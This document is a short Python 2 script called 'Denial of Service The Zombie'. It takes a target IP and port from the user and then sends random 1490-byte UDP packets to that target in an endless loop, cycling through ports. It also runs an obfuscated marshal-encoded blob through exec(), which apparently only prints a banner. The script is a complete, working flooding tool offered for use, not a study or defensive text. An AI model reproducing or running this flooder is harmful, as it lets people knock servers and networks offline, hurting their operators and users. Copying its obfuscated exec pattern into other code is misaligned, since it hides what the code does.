#!/usr/bin/python
# Denial of Service The Zombie
# Coded by Senja
# Github: github.com/thesixtynine/Zombie

import os, sys, time, random, socket, string, marshal

# Code Time

from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

#############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

def write(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)

os.system('clear')
os.system('reset')
time.sleep(1)

print("")

exec(marshal.loads('c\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00@\x00\x00\x00s\x0f\x00\x00\x00d\x00\x00Z\x00\x00e\x00\x00GHd\x01\x00S(\x02\x00\x00\x00s\x8c\x04\x00\x00\x1b[0;32m\n     \xe2\x96\x92\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x92 \xe2\x96\x92\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88   \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84 \xe2\x96\x84\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x93 \xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84    \xe2\x96\x88\xe2\x96\x88\xe2\x96\x93\xe2\x96\x93\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\n     \xe2\x96\x92 \xe2\x96\x92 \xe2\x96\x92 \xe2\x96\x84\xe2\x96\x80\xe2\x96\x91\xe2\x96\x92\xe2\x96\x88\xe2\x96\x88\xe2\x96\x92  \xe2\x96\x88\xe2\x96\x88\xe2\x96\x92\xe2\x96\x93\xe2\x96\x88\xe2\x96\x88\xe2\x96\x92\xe2\x96\x80\xe2\x96\x88\xe2\x96\x80 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x92\xe2\x96\x93\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84 \xe2\x96\x93\xe2\x96\x88\xe2\x96\x88\xe2\x96\x92\xe2\x96\x93\xe2\x96\x88   \xe2\x96\x80\n     \xe2\x96\x91 \xe2\x96\x92 \xe2\x96\x84\xe2\x96\x80\xe2\x96\x92\xe2\x96\x91 \xe2\x96\x92\xe2\x96\x88\xe2\x96\x88\xe2\x96\x91  \xe2\x96\x88\xe2\x96\x88\xe2\x96\x92\xe2\x96\x93\xe2\x96\x88\xe2\x96\x88    \xe2\x96\x93\xe2\x96\x88\xe2\x96\x88\xe2\x96\x91\xe2\x96\x92\xe2\x96\x88\xe2\x96\x88\xe2\x96\x92 \xe2\x96\x84\xe2\x96\x88\xe2\x96\x88\xe2\x96\x92\xe2\x96\x88\xe2\x96\x88\xe2\x96\x92\xe2\x96\x92\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\n       \xe2\x96\x84\xe2\x96\x80\xe2\x96\x92   \xe2\x96\x91\xe2\x96\x92\xe2\x96\x88\xe2\x96\x88   \xe2\x96\x88\xe2\x96\x88\xe2\x96\x91\xe2\x96\x92\xe2\x96\x88\xe2\x96\x88    \xe2\x96\x92\xe2\x96\x88\xe2\x96\x88 \xe2\x96\x92\xe2\x96\x88\xe2\x96\x88\xe2\x96\x91\xe2\x96\x88\xe2\x96\x80  \xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x91\xe2\x96\x92\xe2\x96\x93\xe2\x96\x88  \xe2\x96\x84\n     \xe2\x96\x92\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x92\xe2\x96\x91 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x93\xe2\x96\x92\xe2\x96\x91\xe2\x96\x92\xe2\x96\x88\xe2\x96\x88\xe2\x96\x92   \xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x92\xe2\x96\x91\xe2\x96\x93\xe2\x96\x88  \xe2\x96\x80\xe2\x96\x88\xe2\x96\x93\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x91\xe2\x96\x91\xe2\x96\x92\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x92\n     \xe2\x96\x91\xe2\x96\x92\xe2\x96\x92 \xe2\x96\x93\xe2\x96\x91\xe2\x96\x92\xe2\x96\x91\xe2\x96\x92\xe2\x96\x91 \xe2\x96\x92\xe2\x96\x91\xe2\x96\x92\xe2\x96\x91\xe2\x96\x92\xe2\x96\x91 \xe2\x96\x91 \xe2\x96\x92\xe2\x96\x91   \xe2\x96\x91  \xe2\x96\x91\xe2\x96\x91\xe2\x96\x92\xe2\x96\x93\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x80\xe2\x96\x92\xe2\x96\x91\xe2\x96\x93  \xe2\x96\x91\xe2\x96\x91 \xe2\x96\x92\xe2\x96\x91 \xe2\x96\x91\n     \xe2\x96\x91\xe2\x96\x91\xe2\x96\x92 \xe2\x96\x92 \xe2\x96\x91 \xe2\x96\x92  \xe2\x96\x91 \xe2\x96\x92 \xe2\x96\x92\xe2\x96\x91 \xe2\x96\x91  \xe2\x96\x91      \xe2\x96\x91\xe2\x96\x92\xe2\x96\x91\xe2\x96\x92   \xe2\x96\x91  \xe2\x96\x92 \xe2\x96\x91 \xe2\x96\x91 \xe2\x96\x91  \xe2\x96\x91\n     \xe2\x96\x91 \xe2\x96\x91 \xe2\x96\x91 \xe2\x96\x91 \xe2\x96\x91\xe2\x96\x91 \xe2\x96\x91 \xe2\x96\x91 \xe2\x96\x92  \xe2\x96\x91      \xe2\x96\x91    \xe2\x96\x91    \xe2\x96\x91  \xe2\x96\x92 \xe2\x96\x91   \xe2\x96\x91\n       \xe2\x96\x91 \xe2\x96\x91\n               \xe2\x96\x91 \xe2\x96\x91         \xe2\x96\x91    \xe2\x96\x91       \xe2\x96\x91     \xe2\x96\x91  \xe2\x96\x91\n     \xe2\x96\x91                                  \xe2\x96\x91\n\x1b[0;4;37m \xe2\x97\x8b\xe2\x97\x8f \xe5\x8d\x83\xe5\xb0\xba\xe4\xb8\xa8\xe4\xb9\x87\xe5\x87\xa0\xe1\x97\xaa\xe4\xb8\x82 \xe3\x84\x92\xe5\x8d\x84\xe4\xb9\x87 \xe1\x8e\xb6\xe5\xb0\xba\xe5\x8d\x82\xe3\x84\x9a \xe5\x8d\x84\xe5\x8d\x82\xe3\x84\x92 \xe7\x88\xaa\xe3\x84\x9a \xe3\x84\x92\xe4\xb9\x87\xe5\x8d\x82\xe7\x88\xaa \xe2\x97\x8f\xe2\x97\x8b\nN(\x01\x00\x00\x00t\x04\x00\x00\x00logo(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00t\x00\x00\x00\x00t\x08\x00\x00\x00<module>\x0e\x00\x00\x00s\x02\x00\x00\x00\x06\x01'))

print("")

print(" \033[0m[\033[94;1m#\033[0m] Denial of Service The Zombie")
print(" \033[0m[\033[93;1m*\033[0m] Coded by Senja")
print(" \033[0m[\033[96;1m&\033[0m] My Github: @thelinuxchoice")
print("")
ip = raw_input(" \033[0m[\033[95;1m+\033[0m] \033[77;1mIP Target : ")
port = input(" \033[0m[\033[93;1m+\033[0m] \033[77;1mPort : ")

print("")
write(" \x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mChecking ...")
print("")
print(" IIIIIIIIIIII Loads       15% ")
time.sleep(5)
print(" IIIIIIIIIIIIIIIIII Loads       25% ")
time.sleep(5)
print(" IIIIIIIIIIIIIIIIIIIIIIII Loads       50% ")
time.sleep(5)
print(" IIIIIIIIIIIIIIIIIIIIIIIIIIIIII Loads       75% ")
time.sleep(5)
print(" IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII Loads       100% ")
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "\033[0mSend \033[96;2m%s \033[0mPacket to %s Target:\033[91;2m%s"%(sent,ip,port)
     if port == 65534:
       port = 1
